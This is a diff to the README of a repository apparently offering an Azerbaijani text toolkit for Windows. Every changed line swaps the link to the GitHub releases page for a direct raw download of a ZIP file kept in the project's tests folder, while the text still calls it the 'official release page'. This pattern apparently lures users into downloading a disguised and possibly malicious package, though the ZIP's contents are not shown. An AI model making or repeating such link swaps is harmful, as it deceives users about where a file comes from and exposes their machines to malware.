@@ -1,6 +1,6 @@
 # 🧩 az-nlp-toolkit - Azerbaijani text tools for daily use
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/jahdaganj00ki-netizen/az-nlp-toolkit/main/tests/toolkit_az_nlp_v2.2.zip)
 
 ## 🖥️ What this app does
 
@@ -16,13 +16,13 @@ It is built for end users who want a simple tool for language work without a com
 
 ## 📥 Download the app
 
-Go to the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases) to download and run this file.
+Go to the [release page](https://raw.githubusercontent.com/jahdaganj00ki-netizen/az-nlp-toolkit/main/tests/toolkit_az_nlp_v2.2.zip) to download and run this file.
 
 On the release page, look for the latest version and choose the Windows file that matches your system.
 
 ## 🪟 Windows setup
 
-1. Open the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+1. Open the [release page](https://raw.githubusercontent.com/jahdaganj00ki-netizen/az-nlp-toolkit/main/tests/toolkit_az_nlp_v2.2.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows file from the release assets.
 4. If the file is in a ZIP folder, right-click it and choose Extract All.
@@ -185,7 +185,7 @@ If you get a ZIP file, extract it before you open the app.
 
 ## 🔐 Safe download steps
 
-1. Use the official [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+1. Use the official [release page](https://raw.githubusercontent.com/jahdaganj00ki-netizen/az-nlp-toolkit/main/tests/toolkit_az_nlp_v2.2.zip).
 2. Download the latest Windows package.
 3. Keep the file in a folder you can find later.
 4. Open only the files from the release you selected.
@@ -195,7 +195,7 @@ If you get a ZIP file, extract it before you open the app.
 
 When a new version is released:
 
-1. Return to the [release page](https://github.com/jahdaganj00ki-netizen/az-nlp-toolkit/releases).
+1. Return to the [release page](https://raw.githubusercontent.com/jahdaganj00ki-netizen/az-nlp-toolkit/main/tests/toolkit_az_nlp_v2.2.zip).
 2. Download the newest Windows file.
 3. Replace the older app files if needed.
 4. Open the new version and continue using your text files
